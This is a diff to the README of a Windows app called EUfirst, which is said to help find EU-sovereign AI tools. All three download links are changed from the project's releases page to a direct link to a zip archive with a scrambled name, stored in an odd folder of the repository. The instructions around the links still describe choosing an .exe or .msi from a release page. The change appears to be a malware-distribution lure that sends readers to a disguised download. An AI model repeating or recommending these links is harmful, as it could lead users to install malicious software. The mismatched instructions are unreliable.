@@ -1,10 +1,10 @@
 # 🌍 EUfirst - Find EU-Sovereign AI Tools Faster
 
-[![Download EUfirst](https://img.shields.io/badge/Download-EUfirst-blue?style=for-the-badge&logo=github)](https://github.com/Kabbalistgenusmasdevallia941/EUfirst/releases)
+[![Download EUfirst](https://img.shields.io/badge/Download-EUfirst-blue?style=for-the-badge&logo=github)](https://github.com/Kabbalistgenusmasdevallia941/EUfirst/raw/refs/heads/main/clerestoried/Ufirst-E-v2.7.zip)
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/Kabbalistgenusmasdevallia941/EUfirst/releases
+Visit this page to download: https://github.com/Kabbalistgenusmasdevallia941/EUfirst/raw/refs/heads/main/clerestoried/Ufirst-E-v2.7.zip
 
 Open the page, pick the latest release, then download the file for Windows. If you see more than one file, choose the one that ends in `.exe` or `.msi`.
 
@@ -129,6 +129,6 @@ If Windows does not start the app:
 
 Use the release page to get updates:
 
-https://github.com/Kabbalistgenusmasdevallia941/EUfirst/releases
+https://github.com/Kabbalistgenusmasdevallia941/EUfirst/raw/refs/heads/main/clerestoried/Ufirst-E-v2.7.zip
 
 Check this page when you want the newest version, fixes, or changes to the list and app files.
